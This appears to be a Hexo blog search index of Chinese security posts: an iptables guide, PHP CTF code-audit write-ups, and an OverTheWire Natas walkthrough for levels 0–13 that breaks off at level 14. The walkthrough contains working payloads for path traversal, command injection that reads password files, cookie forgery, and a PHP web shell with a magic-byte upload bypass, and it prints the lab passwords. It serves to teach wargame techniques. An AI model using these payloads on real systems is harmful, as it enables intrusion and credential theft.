<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[iptables命令详解]]></title>
    <url>%2F2018%2F07%2F02%2Fiptables%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[iptables命令详解iptables是防火墙,已经集成在内核中(netfilter项目的一部分),所有的Linux发行版都能使用 iptables . 快捷高效同时也有很好的扩展性. 语法简短的语法: 1iptables (选项) (参数) 高级命格式: 12iptables [-t 表名] &#123;-A|-D|-I|-F|-L|-Z|-P&#125; 规则链名 [规则号] &#123;-i/o 网卡名&#125; -p 协议名 &#123;-s 源IP/源子网&#125; --sport 源端口 &#123;-d 目标IP|目标子网&#125; --dport 目标端口 -j 动作参数说明 选项： 12345678910111213141516-t&lt;表&gt;：指定要操纵的表；-A：向规则链中添加条目；-D：从规则链中删除条目；-i：向规则链中插入条目；-R：替换规则链中的条目；-L：显示规则链中已有的条目；-F：清楚规则链中已有的条目；-Z：清空规则链中的数据包计算器和字节计数器；-N：创建新的用户自定义规则链；-P：定义规则链中的默认目标；-h：显示帮助信息；-p：指定要匹配的数据包协议类型；-s：指定要匹配的数据包源ip地址；-j&lt;目标&gt;：指定要跳转的目标；-i&lt;网络接口&gt;：指定数据包进入本机的网络接口；-o&lt;网络接口&gt;：指定数据包要离开本机所使用的网络接口。 表名包括： 1234raw：高级功能，如：网址过滤。mangle：数据包修改（QOS），用于实现服务质量。net：地址转换，用于网关路由器。filter：包过滤，用于防火墙规则。 规则链名包括： 12345INPUT链：处理输入数据包。OUTPUT链：处理输出数据包。PORWARD链：处理转发数据包。PREROUTING链：用于目标地址转换（DNAT）。POSTOUTING链：用于源地址转换（SNAT）。 动作包括： 1234567accept：接收数据包。DROP：丢弃数据包。REDIRECT：重定向、映射、透明代理。SNAT：源地址转换。DNAT：目标地址转换。MASQUERADE：IP伪装（NAT），用于ADSL。LOG：日志记录。 在Centos中iptables服务命令：123456789101112131415-- 启动服务# /etc/init.d/iptables start # service iptables start-- 停止服务# /etc/init.d/iptables stop# service iptables stop-- 重启服务# /etc/init.d/iptables restart# service iptables restart-- 保存设置# /etc/init.d/iptables save# service iptables save 在Ubuntu中配置iptables查看系统是否安装防火墙可以看到: 123/# whereis iptablesiptables: /sbin/iptables /usr/share/iptables /usr/share/man/man8/iptables.8.gz #表示已经安装iptables 如果默认没有安装，请运行此命令安装防火墙 ： 1apt-get install iptables Debian / Ubuntu 上 iptables 是不会保存规则的。需要按如下步骤进行，让网卡关闭保存 iptables 规则，启动时加载 iptables 规则。 开始配置 iptables.rules 文件 (仅供参考): 1vim /etc/iptables.rules 12345678910111213141516171819202122# sample configuration for iptables service# you can edit this manually or use system-config-firewall# please do not ask us to add additional ports/services to this default configuration*filter:INPUT ACCEPT [0:0]:FORWARD ACCEPT [0:0]:OUTPUT ACCEPT [0:0]-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT-A INPUT -p icmp -j ACCEPT-A INPUT -i lo -j ACCEPT-A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT-A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT-A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT-A INPUT -p tcp -m state --state NEW -m tcp --dport 465 -j ACCEPT-A INPUT -p tcp -m state --state NEW -m tcp --dport 3389 -j ACCEPT-A INPUT -p tcp -m state --state NEW -m tcp --dport 3306 -j ACCEPT-A INPUT -p tcp -m state --state NEW -m tcp --dport 8080 -j ACCEPT-A INPUT -p icmp -m limit --limit 1/s --limit-burst 10 -j ACCEPT-A INPUT -p icmp -m limit --limit 100/sec --limit-burst 100 -j ACCEPT-A INPUT -j REJECT --reject-with icmp-host-prohibited-A FORWARD -j REJECT --reject-with icmp-host-prohibitedCOMMIT 使防火墙规则生效： 1iptables-restore &lt; /etc/iptables.rules 创建文件，添加以下内容，使防火墙开机启动 1vim /etc/network/if-pre-up.d/iptables 12#!/bin/bashiptables-restore &lt; /etc/iptables.rules 添加执行权限： 1chmod +x /etc/network/if-pre-up.d/iptables 查看规则是否生效： 1iptables -L -n 常用规则：123456789101112#开启80端口iptables -A INPUT -p tcp --dport 80 -j ACCEPT#屏蔽单个IP的命令iptables -I INPUT -s 123.45.6.7 -j DROP #封整个段即从123.0.0.1到123.255.255.254的命令iptables -I INPUT -s 123.0.0.0/8 -j DROP #允许所有本机向外的访问iptables -A OUTPUT -j ACCEPT #禁止其他未允许的规则访问iptables -A INPUT -j reject #只允许192.168.0.3的机器进行SSH连接iptables -A INPUT -s 192.168.0.3 -p tcp --dport 22 -j ACCEPT]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[urldecode二次编码绕过]]></title>
    <url>%2F2018%2F05%2F21%2Furldecode%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[urldecode二次编码绕过urldecode() 用于解码 URL 字符串函数，此函数用于解码给出的已编码字符串中的任何 %##以及中文等被编码的内容。 （加号（’+’）被解码成一个空格字符）。 与之对应的 urlencode() 用于编码 URL 字符串函数。此函数便于将字符串编码并将其用于 URL 的请求部分。 题目源码： 12345678910111213141516171819202122&lt;?phpif(eregi("hackerDJ",$_GET[id])) &#123;echo("not allowed!");exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == "hackerDJ")&#123;echo "Access granted!";echo "flag";&#125;?&gt; eregi()函数 定义和用法：eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写。Eregi()可以特别有用的检查有效性字符串,如密码。可选的输入参数规则包含一个数组的所有匹配表达式,他们被正则表达式的括号分组。 返回值：如果匹配成功返回true,否则,则返回false 使用eregi()函数来判断，所以参数中不能直接有hackerDJ，获取参数后使用urldecode对id的值进行解码，所以可以让id解码后的值是hackerDJ进行url编码后的值，由于浏览器会自行解码一次，所以编码两次就好 解题方法： GET请求：?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[strcmp字符串比较绕过]]></title>
    <url>%2F2018%2F05%2F21%2Fstrcmp%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[strcmp() 函数strcmp() 函数比较两个字符串，且区分大小写 。 语法：strcmp(string1,string2) 返回值： 1230 - 如果两个字符串相等&lt;0 - 如果 string1 小于 string2&gt;0 - 如果 string1 大于 string2 实例： 12345&lt;?phpecho strcmp(&quot;Hello&quot;,&quot;Hello&quot;); // 返回0echo &quot;&lt;br&gt;&quot;;echo strcmp(&quot;Hello&quot;,&quot;hELLo&quot;); // 返回-1?&gt; strcmp() 函数漏洞注：这一个漏洞适用与5.3之前版本的php 题目代码： 123456789&lt;?php$flag = "flag&#123;xxxxx&#125;";if (isset($_GET['a'])) &#123;if (strcmp($_GET['a'], $flag) == 0) die('Flag: '.$flag);elseprint 'No';&#125;?&gt; 使用GET方法获取参数a，使用strcmp()函数比较$flag与用户输入的值。 传入的期望类型是字符串类型的数据 ，但是这个函数当接受到不符合字符串类型的参数就会发生错误，并返回0 所以我们只需要提交一个非字符串类型的参数即可使得判断条件成立，比如使用数组类型 解题方法： GET请求：?a[]=2 因为strcmp()无法比较数组，则报错并返回0，0==0成立，则输出flag。]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[extract变量覆盖]]></title>
    <url>%2F2018%2F05%2F21%2Fextract%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%2F</url>
    <content type="text"><![CDATA[extract()函数extract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回成功设置的变量数目。 实例 将键值 “Cat”、”Dog” 和 “Horse” 赋值给变量 $a、$b和 $c： 123456&lt;?php$a = "Original";$my_array = array("a" =&gt; "Cat","b" =&gt; "Dog", "c" =&gt; "Horse");extract($my_array);echo "$a = $a; $b = $b; $c = $c";?&gt; 运行结果为： 1$a = Cat; $b = Dog; $c = Horse 更多extract函数细节请参考-&gt;链接 extract()变量覆盖1题目源码： 12345678910111213141516&lt;?php$flag='xxx';extract($_GET);if(isset($shiyan))&#123;$content=trim(file_get_contents($flag));if($shiyan==$content)&#123;echo'flag&#123;xxx&#125;';&#125;else&#123;echo'Oh.no';&#125;&#125;?&gt; URL 通过 get 的方式传参，传输的数据以数组的形式被封装在$_GET 中；extract()函数从数组中将变量导入到当前的符号表，该函数使用数组键名作为变量名，使用数组键值作为变量值；isset()函数判断是否存在变量$shiyan;trim()函数移除字符串两侧的空白字符或其他预定义字符 ，这里是移除字符串两侧的空格；file_get_contents()函数将整个文件读入一个字符串；假如$shiyan的值等于文件的内容($content)时，就打印出flag 解题方法： GET请求： ?flag=&amp;gift= extract()会将$flag和$shiyan的值覆盖了，将变量的值设置为空或者不存在的文件就满足$shiyan== $content。 extract()变量覆盖2题目源码： 1234567891011121314151617&lt;?php if ($_SERVER["REQUEST_METHOD"] == “POST”) &#123; ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) &#123; ?&gt; &lt;div class=”alert alert-success”&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php &#125; ?&gt; &lt;?php &#125; ?&gt; 这次要使用POST的方法提交数据，extract($_POST)会将POST的数据中的键名和键值转换为相应的变量名和变量值，此时利用extract()函数覆盖$pass 和$thepassword_123的值，使$pass == $thepassword_123即可得到flag 所以只要以POST的方法提交pass=&amp;thepassword_123= 即可。]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OverTheWire-Natas]]></title>
    <url>%2F2018%2F05%2F17%2FOverTheWire-Natas%2F</url>
    <content type="text"><![CDATA[NATAS0-33Natas教授了服务器端网络安全的基础知识。natas的每个级别都包含位于http://natasX.natas.labs.overthewire.org的自己的网站 ，其中X是级别号码。有没有SSH登录。要访问某个级别，请输入该级别的用户名（例如，0级的natas0）及其密码。每个级别都可以访问下一级别的密码。你的工作是以某种方式获得下一个密码并升级。所有密码也存储在/ etc / natas_webpass /中。例如，natas5的密码存储在/ etc / natas_webpass / natas5文件中，并且只能由natas4和natas5读取。 Natas Level 0123Username: natas0Password: natas0URL: http://natas0.natas.labs.overthewire.org 过程： 进入题目后 1You can find the password for the next level on this page. 查看源码获得flag 12345678910111213141516171819&lt;html&gt;&lt;head&gt;&lt;!-- This stuff in the header has nothing to do with the level --&gt;&lt;link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"&gt;&lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /&gt;&lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /&gt;&lt;script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"&gt;&lt;/script&gt;&lt;script src="http://natas.labs.overthewire.org/js/jquery-ui.js"&gt;&lt;/script&gt;&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src="http://natas.labs.overthewire.org/js/wechall.js"&gt;&lt;/script&gt;&lt;script&gt;var wechallinfo = &#123; "level": "natas0", "pass": "natas0" &#125;;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;natas0&lt;/h1&gt;&lt;div id="content"&gt;You can find the password for the next level on this page.&lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto Natas Level 0 → Level 11234Username: natas1URL: http://natas1.natas.labs.overthewire.org密码：gtVrDuiDfck831PqWsLEZy5gyDz1clto 过程： 进入题目后 1ou can find the password for the next level on this page, but rightclicking has been blocked! 提示密码就在这个页面，但是鼠标右键被禁用了，所以通过F12查看源码来获取密码 The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi Natas Level 1 → Level 21234Username: natas2URL: http://natas2.natas.labs.overthewire.org密码： ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi 过程： 先看看页面源码 1234567891011121314151617&lt;html&gt;&lt;head&gt;&lt;!-- This stuff in the header has nothing to do with the level --&gt;&lt;link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"&gt;&lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /&gt;&lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /&gt;&lt;script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"&gt;&lt;/script&gt;&lt;script src="http://natas.labs.overthewire.org/js/jquery-ui.js"&gt;&lt;/script&gt;&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src="http://natas.labs.overthewire.org/js/wechall.js"&gt;&lt;/script&gt;&lt;script&gt;var wechallinfo = &#123; "level": "natas2", "pass": "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi" &#125;;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;natas2&lt;/h1&gt;&lt;div id="content"&gt;There is nothing on this page&lt;img src="files/pixel.png"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 发现这样一个图片files/pixel.png，但是非常小，感觉没有什么用，那就直接访问http://natas2.natas.labs.overthewire.org/files/ 发现除了pixel.png图片还有一个users.txt的文件 获得文件内容 1234567# username:passwordalice:BYNdCesZqWbob:jw2ueICLvTcharlie:G5vCxkVV3mnatas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14eve:zo4mJWyNj2mallory:9urtcpzBmH natas3: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 Natas Level 2 → Level 31234Username: natas3URL: http://natas3.natas.labs.overthewire.org密码：sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 过程： 进入题目后查看源码，发现没有什么可用信息，那就看一下robots文件 12User-agent: *Disallow: /s3cr3t/ 访问 /s3cr3t/，发现users.txt文件,接着访问users.txt获得下一关的密码 natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ Natas Level 3 → Level 41234Username: natas4URL: http://natas4.natas.labs.overthewire.org密码：Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ 过程： 1Access disallowed. You are visiting from &quot;&quot; while authorized users should come only from &quot;http://natas5.natas.labs.overthewire.org/&quot; 从http://natas5.natas.labs.overthewire.org/访问就可以获得密码，那就直接使用Burp suite抓包，将请求头的Referer改为题目指定的 Http协议中的referer表示的就是你从哪个页面来的 1Referer: http://natas5.natas.labs.overthewire.org/ The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq Natas Level 4 → Level 51234Username: natas5URL: http://natas5.natas.labs.overthewire.org密码：iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq 过程： 进入题目后提示还没有登陆 1Access disallowed. You are not logged in 用Burp suite获取请求包 12345678910GET / HTTP/1.1Host: natas5.natas.labs.overthewire.orgUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Cookie: loggedin=0Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZxConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0 发现Cookie: loggedin=0，猜测0为没有登陆，1为已经登陆，所以将0改为1，重放后获得密码 The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 Natas Level 5 → Level 61234Username: natas6URL: http://natas6.natas.labs.overthewire.org密码：aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 过程： 进入题目后有一个提交框，我们还是先看看源码，点击View sourcecode 发现PHP脚本 12345678910&lt;?include "includes/secret.inc"; if(array_key_exists("submit", $_POST)) &#123; if($secret == $_POST['secret']) &#123; print "Access granted. The password for natas7 is &lt;censored&gt;"; &#125; else &#123; print "Wrong secret"; &#125; &#125;?&gt; 我们输入的参数和预先设定的$secret一样就可以获得密码，那直接访问secret.inc文件试试看 访问http://natas6.natas.labs.overthewire.org/includes/secret.inc，虽然页面空白，但是鼠标右键查看源码~哇 123&lt;?$secret = "FOEIUWGHFEEUHOFUOIU";?&gt; 现在回来直接在提交框提交FOEIUWGHFEEUHOFUOIU获得密码 The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 Natas Level 6 → Level 71234Username: natas7URL: http://natas7.natas.labs.overthewire.org密码：7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 过程： 发现两个超链接，但是并没有什么用，查看网页源码获得提示 1&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt; 猜测是文件包含 直接访问：http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../etc/natas_webpass/natas8获得密码 DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe Natas Level 7 → Level 81234Username: natas8URL: http://natas8.natas.labs.overthewire.org密码： DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe 过程： 还是点击View sourcecode看看源码吧 12345678910111213141516&lt;?$encodedSecret = "3d3d516343746d4d6d6c315669563362";function encodeSecret($secret) &#123; return bin2hex(strrev(base64_encode($secret)));&#125;if(array_key_exists("submit", $_POST)) &#123; if(encodeSecret($_POST['secret']) == $encodedSecret) &#123; print "Access granted. The password for natas9 is &lt;censored&gt;"; &#125; else &#123; print "Wrong secret"; &#125;&#125;?&gt; 提交的参数经过三次处理后等于$encodedSecret就会获得密码 bin2hex()函数是把 ASCII 字符的字符串转换为十六进制值strrev()函数是反转字符串base64_encode()进行Base64编码 那个就写一个脚本还原$encodedSecret的值，代码如下 12345678&lt;?php$data = "3d3d516343746d4d6d6c315669563362";$result =base64_decode(strrev(hex2bin($data)));echo $result?&gt; 提交运行的结果获得密码 The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl Natas Level 8 → Level 91234Username: natas9URL: http://natas9.natas.labs.overthewire.org密码：W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl 过程： 查看源码 1234567891011&lt;?$key = "";if(array_key_exists("needle", $_REQUEST)) &#123; $key = $_REQUEST["needle"];&#125;if($key != "") &#123; passthru("grep -i $key dictionary.txt");&#125;?&gt; 通过passthru()来执行外部命令，可以使用;命令分隔符，这将允许我们在一行中使用2个命令。我们还将使用#注释命令，它将注释符号后面的其余文本。 因此输入; cat /etc/natas_webpass/natas10 #将运行passthru命令; grep -i ; cat /etc/natas_webpass/natas10 #并注释掉dictionary.txt。 nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu Natas Level 9 → Level 101234Username: natas10URL: http://natas10.natas.labs.overthewire.org密码：nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu 过程： 感觉套路一样，只是说过滤了某些字符，还是查看源码 123456789101112131415&lt;?$key = "";if(array_key_exists("needle", $_REQUEST)) &#123; $key = $_REQUEST["needle"];&#125;if($key != "") &#123; if(preg_match('/[;|&amp;]/',$key)) &#123; print "Input contains an illegal character!"; &#125; else &#123; passthru("grep -i $key dictionary.txt"); &#125;&#125;?&gt; 过滤了；和&amp;，那就想办法绕过，使用.* /etc/natas_webpass/natas11 #，.#意思是通过grep搜索所有，并将其匹配到 /etc/natas_webpass/natas11。 1234567Output:.htaccess:AuthType Basic.htaccess: AuthName &quot;Authentication required&quot;.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd.htaccess: require valid-user.htpasswd:natas10:$1$XOXwo/z0$K/6kBzbw4cQ5exEWpW5OV0/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK Natas Level 10 → Level 111234Username: natas11URL: http://natas11.natas.labs.overthewire.org密码：U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK 过程： 还是之接看源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?$defaultdata = array( "showpassword"=&gt;"no", "bgcolor"=&gt;"#ffffff");function xor_encrypt($in) &#123; $key = '&lt;censored&gt;'; $text = $in; $outText = ''; // Iterate through each character for($i=0;$i&lt;strlen($text);$i++) &#123; $outText .= $text[$i] ^ $key[$i % strlen($key)]; &#125; return $outText;&#125;function loadData($def) &#123; global $_COOKIE; $mydata = $def; if(array_key_exists("data", $_COOKIE)) &#123; $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true); if(is_array($tempdata) &amp;&amp; array_key_exists("showpassword", $tempdata) &amp;&amp; array_key_exists("bgcolor", $tempdata)) &#123; if (preg_match('/^#(?:[a-f\d]&#123;6&#125;)$/i', $tempdata['bgcolor'])) &#123; $mydata['showpassword'] = $tempdata['showpassword']; $mydata['bgcolor'] = $tempdata['bgcolor']; &#125; &#125; &#125; return $mydata;&#125;function saveData($d) &#123; setcookie("data", base64_encode(xor_encrypt(json_encode($d))));&#125;$data = loadData($defaultdata);if(array_key_exists("bgcolor",$_REQUEST)) &#123; if (preg_match('/^#(?:[a-f\d]&#123;6&#125;)$/i', $_REQUEST['bgcolor'])) &#123; $data['bgcolor'] = $_REQUEST['bgcolor']; &#125;&#125;saveData($data);?&gt;&lt;h1&gt;natas11&lt;/h1&gt;&lt;div id="content"&gt;&lt;body style="background: &lt;?=$data['bgcolor']?&gt;;"&gt;Cookies are protected with XOR encryption&lt;br/&gt;&lt;br/&gt;&lt;?if($data["showpassword"] == "yes") &#123; print "The password for natas12 is &lt;censored&gt;&lt;br&gt;";&#125;?&gt; 首先定义了一个数组，然后创建了一个’xor_encrypt’函数,该函数将一个字符串作为输入并使用一个经过审查的密钥执行XOR操作 ;’loadData’函数，将默认数组加载到$ mydata中，检查cookie中是否存在数据，如果是，则尝试对其进行base64_decode，对其执行XOR操作，并将JSON解码为数组 ,如果这确实是一个数组，并且找到适当的值，则使用cookie中的值更新mydata的值 ,如果不是，则保留默认值;’saveData’函数，该函数用于将Cookie设置为JSON编码，异或，然后base64编码的数据. XOR加密的特性 123Original_Data XOR KEY = Encrypted_DataOriginal_Data XOR Encrypted_Data = KEY 所以使用这个特性写一个脚本来算出KEY，Cookie=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=， 1234567891011121314&lt;php? $cookie = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw'); function xor_encrypt($in) &#123; $text = $in; $key = json_encode(array( "showpassword"=&gt;"no", "bgcolor"=&gt;"#ffffff")); $outText = ''; // Iterate through each character for($i=0;$i&lt;strlen($text);$i++) &#123; $outText .= $text[$i] ^ $key[$i % strlen($key)]; &#125; return $outText; &#125; print xor_encrypt($cookie); ?&gt; 运行结果为： 1qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq 所以key为qw8J，接着再写算出以qw8J为密钥，’showpassword’的值为’yes’ 的密文 1234567891011121314&lt;?phpfunction xor_encrypt() &#123; $text = json_encode(array( "showpassword"=&gt;"yes", "bgcolor"=&gt;"#ffffff")); $key = "qw8J"; $outText = ''; // Iterate through each character for($i=0;$i&lt;strlen($text);$i++) &#123; $outText .= $text[$i] ^ $key[$i % strlen($key)]; &#125; return $outText;&#125;print base64_encode(xor_encrypt());?&gt; 运行结果为 1ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK 最后使用Burp suite抓包修改Cookie为刚得到的获得密码 The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 Natas Level 11 → Level 121234Username: natas12URL: http://natas12.natas.labs.overthewire.org密码：EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 过程： 同样先看源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;? function genRandomString() &#123; $length = 10; $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; $string = ""; for ($p = 0; $p &lt; $length; $p++) &#123; $string .= $characters[mt_rand(0, strlen($characters)-1)]; &#125; return $string;&#125;function makeRandomPath($dir, $ext) &#123; do &#123; $path = $dir."/".genRandomString().".".$ext; &#125; while(file_exists($path)); return $path;&#125;function makeRandomPathFromFilename($dir, $fn) &#123; $ext = pathinfo($fn, PATHINFO_EXTENSION); return makeRandomPath($dir, $ext);&#125;if(array_key_exists("filename", $_POST)) &#123; $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); if(filesize($_FILES['uploadedfile']['tmp_name']) &gt; 1000) &#123; echo "File is too big"; &#125; else &#123; if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) &#123; echo "The file &lt;a href=\"$target_path\"&gt;$target_path&lt;/a&gt; has been uploaded"; &#125; else&#123; echo "There was an error uploading the file, please try again!"; &#125; &#125;&#125; else &#123;?&gt;&lt;form enctype="multipart/form-data" action="index.php" method="POST"&gt;&lt;input type="hidden" name="MAX_FILE_SIZE" value="1000" /&gt;&lt;input type="hidden" name="filename" value="&lt;? print genRandomString(); ?&gt;.jpg" /&gt;Choose a JPEG to upload (max 1KB):&lt;br/&gt;&lt;input name="uploadedfile" type="file" /&gt;&lt;br /&gt;&lt;input type="submit" value="Upload File" /&gt;&lt;/form&gt;&lt;? &#125; ?&gt; genRandomString函数创建一个10个字符的随机字符串 ； makeRandomPath函数传入一个目录和扩展名，并创建一个随机文件名； makeRandomPathFromFilename函数，它接收一个目录和一个文件名，并从文件名中提取扩展名。然后它使用这个信息来调用makeRandomPath； 然后PHP代码检查是否已上传文件，然后从提供的文件名创建一个随机路径。然后它会检查大小以确保其大小不超过1000字节，如果这些检查通过，它会上传文件并告诉路径 我先正常上传了一个正常的小于1K的图片，成功返回了路径和重命名后的文件名。于是上传一个shell 123&lt;? passthru($_GET['cmd']); ?&gt; 修该扩展名为jpg，使用burp suite 抓包 12345678910111213141516171819202122232425262728POST /index.php HTTP/1.1Host: natas12.natas.labs.overthewire.orgUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: http://natas12.natas.labs.overthewire.org/Content-Type: multipart/form-data; boundary=---------------------------27523163275597Content-Length: 454Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==Connection: closeUpgrade-Insecure-Requests: 1-----------------------------27523163275597Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;1000-----------------------------27523163275597Content-Disposition: form-data; name=&quot;filename&quot;4flu9u53ae.jpg-----------------------------27523163275597Content-Disposition: form-data; name=&quot;uploadedfile&quot;; filename=&quot;2.jpg&quot;Content-Type: image/jpeg &lt;? passthru($_GET[&apos;cmd&apos;]); ?&gt; -----------------------------27523163275597-- 修改filename的扩展名，将jpg改为php 4flu9u53ae.php 返回： 1The file upload/d0tmjn54an.php has been uploaded shell上传成功，接着执行命令cat /etc/natas_webpass/natas13查看密码 访问：natas12.natas.labs.overthewire.org/upload/d0tmjn54an.php?cmd=cat /etc/natas_webpass/natas13 获得密码 jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY Natas Level 12 → Level 131234Username: natas13URL: http://natas13.natas.labs.overthewire.org密码：jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY 过程： 这里就不把源码复制过来了，这题不同的是用了exif_imagetype 函数来获取图片的类型。大多数文件类型（如JPEG，ZIP，TAR等）在文件的开头都有一个“ Magic Number ”来帮助验证它的文件类型。因此，要通过exif_imagetype函数检查，我们的文件必须以支持的图像格式的幻数开始。 jpeg文件有固定的文件头，其文件头的格式如下： 123Start Marker | JFIF Marker | Header Length | Identifier 0xff, 0xd8 | 0xff, 0xe0 | 2-bytes | &quot;JFIF\0&quot; 用python创建一个shell脚本 123fh = open('shell.jpg','w')fh.write('\xFF\xD8\xFF\xE0' + '&lt;? passthru($_GET["cmd"]); ?&gt;')fh.close() 然后用上一题同样的方法上传，获取密码 Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 Natas Level 13 → Level 141234Username: natas14URL: http://natas14.natas.labs.overthewire.org密码：Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 过程： 12345678910111213141516171819202122232425&lt;?if(array_key_exists("username", $_REQUEST)) &#123; $link = mysql_connect('localhost', 'natas14', '&lt;censored&gt;'); mysql_select_db('natas14', $link); $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; if(array_key_exists("debug", $_GET)) &#123; echo "Executing query: $query&lt;br&gt;"; &#125; if(mysql_num_rows(mysql_query($query, $link)) &gt; 0) &#123; echo "Successful login! The password for natas15 is 